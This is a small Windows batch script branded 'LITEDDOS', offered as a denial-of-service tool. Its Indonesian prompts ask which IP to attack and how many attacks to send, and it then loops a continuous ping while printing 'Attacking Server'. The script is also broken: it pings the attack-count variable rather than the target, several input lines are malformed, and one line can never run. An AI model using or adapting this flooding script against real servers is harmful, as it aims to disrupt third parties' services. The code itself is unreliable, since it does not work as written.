@echo off

mode 67,16
title LITEDDOS BY MR-T-N-D
color a
cls
echo.
echo LITEDDOS BY ༺꧁ঔৣℳℛ•ＴＮＤঔৣ꧂༻
echo.
set /p x-Server-Target:
echo.
ping %x%
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
set /p m=ip Yang Mau Lo Serang :
echo.
set /p n=Mau Berapa Penyerangan :
set /p o= YAKIN MAU (Y/N) = 
echo.
:DDOS
echo Attacking Server With LITEDDOS To  %m%
ping %n% -i %n% -t >nul
goto DDOS
set /p b-berhasil:)